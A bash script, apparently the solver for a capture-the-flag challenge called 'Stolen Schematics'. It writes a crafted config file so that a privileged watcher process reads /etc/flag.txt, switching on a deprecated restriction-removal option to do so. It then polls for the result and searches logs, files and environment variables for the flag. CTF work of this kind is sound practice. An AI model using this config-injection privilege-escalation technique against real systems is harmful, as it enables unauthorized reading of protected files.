#!/bin/bash
# Complete Stolen Schematics Exploit with Monitoring
# Run this after SSH'ing into the container

echo "==================================="
echo "STOLEN SCHEMATICS - AUTO EXPLOIT"
echo "==================================="
echo ""

# Step 1: Verify sync-loop.sh is running
echo "[1] Checking if sync-loop.sh is running..."
if ps aux | grep -v grep | grep "sync-loop.sh" > /dev/null; then
    echo "    [+] sync-loop.sh is running!"
    ps aux | grep sync-loop.sh | grep -v grep
else
    echo "    [!] WARNING: sync-loop.sh not detected!"
    echo "    This exploit may not work without the watcher process."
fi
echo ""

# Step 2: Check directory permissions
echo "[2] Checking directory structure..."
ls -la /opt/mc/.sync/ 2>/dev/null && echo "    [+] .sync directory exists" || echo "    [!] Cannot access .sync directory"
ls -la /opt/mc/config/ 2>/dev/null && echo "    [+] config directory exists" || echo "    [!] Cannot access config directory"
echo ""

# Step 3: Write exploit config
echo "[3] Writing exploit configuration..."
cat > /opt/mc/config/sync-request.conf << 'EOF'
talldwarf-sync-command=FILE-READ:/etc/flag.txt
talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true
talldwarf-sync-output=/opt/mc/.sync/sync.result
EOF

if [ -f /opt/mc/config/sync-request.conf ]; then
    echo "    [+] Config written successfully"
    echo "    [+] Contents:"
    cat /opt/mc/config/sync-request.conf | sed 's/^/        /'
else
    echo "    [!] Failed to write config"
    exit 1
fi
echo ""

# Step 4: Monitor for flag (60 seconds = 60 checks)
echo "[4] Monitoring for flag (60 seconds)..."
echo "    Press Ctrl+C to stop early if flag is found"
echo ""

SUCCESS=0
for i in {1..60}; do
    # Show progress every 5 seconds
    if [ $((i % 5)) -eq 0 ]; then
        echo "    [Check $i/60] Still waiting..."
    fi
    
    # Check if sync.result is readable
    if [ -r /opt/mc/.sync/sync.result ]; then
        echo ""
        echo "=========================================="
        echo "    [+] FLAG FOUND!"
        echo "=========================================="
        cat /opt/mc/.sync/sync.result
        echo "=========================================="
        SUCCESS=1
        break
    fi
    
    # Check if config was processed (deleted/moved)
    if [ ! -f /opt/mc/config/sync-request.conf ] && [ $i -eq 5 ]; then
        echo "    [+] Config file processed by watcher!"
        echo "    [*] Flag should appear soon..."
    fi
    
    # Check sync directory for new files
    if [ $i -eq 10 ]; then
        echo "    [*] Current sync directory contents:"
        ls -la /opt/mc/.sync/ 2>/dev/null | sed 's/^/        /'
    fi
    
    sleep 1
done

echo ""

# Step 5: If not successful, try alternative approaches
if [ $SUCCESS -eq 0 ]; then
    echo "[5] Flag not found in sync.result. Trying alternatives..."
    echo ""
    
    # Alternative 1: Check logs
    echo "    [A] Checking Minecraft logs..."
    if grep -i "TDHT" /opt/mc/logs/latest.log 2>/dev/null; then
        echo "        [+] FLAG FOUND IN LOGS!"
    else
        echo "        [-] No flag in logs"
    fi
    echo ""
    
    # Alternative 2: Check all readable locations
    echo "    [B] Searching all readable locations..."
    find /opt/mc /tmp /home/player -type f -readable 2>/dev/null | while read file; do
        if grep -q "TDHT" "$file" 2>/dev/null; then
            echo "        [+] FLAG FOUND IN: $file"
            grep "TDHT" "$file"
        fi
    done
    echo ""
    
    # Alternative 3: Check environment
    echo "    [C] Checking environment variables..."
    if env | grep -i "TDHT"; then
        echo "        [+] FLAG FOUND IN ENVIRONMENT!"
    else
        echo "        [-] No flag in environment"
    fi
    echo ""
    
    # Alternative 4: Check if sync.result exists but isn't readable yet
    echo "    [D] Checking sync.result status..."
    if [ -f /opt/mc/.sync/sync.result ]; then
        echo "        [!] sync.result EXISTS but isn't readable yet!"
        echo "        [*] File permissions:"
        ls -la /opt/mc/.sync/sync.result | sed 's/^/            /'
        echo "        [*] Waiting 10 more seconds..."
        sleep 10
        if [ -r /opt/mc/.sync/sync.result ]; then
            echo "        [+] NOW READABLE!"
            cat /opt/mc/.sync/sync.result
            SUCCESS=1
        else
            echo "        [!] Still not readable"
        fi
    else
        echo "        [-] sync.result doesn't exist yet"
    fi
    echo ""
fi

# Final summary
echo "==================================="
if [ $SUCCESS -eq 1 ]; then
    echo "EXPLOIT SUCCESSFUL!"
else
    echo "EXPLOIT INCOMPLETE"
    echo ""
    echo "Next steps to try manually:"
    echo "1. cat /opt/mc/.sync/sync.result"
    echo "2. cat /opt/mc/logs/latest.log | grep -i TDHT"
    echo "3. find /opt/mc -readable -type f | xargs grep TDHT 2>/dev/null"
    echo "4. Check if watcher is using different output path"
fi
echo "==================================="
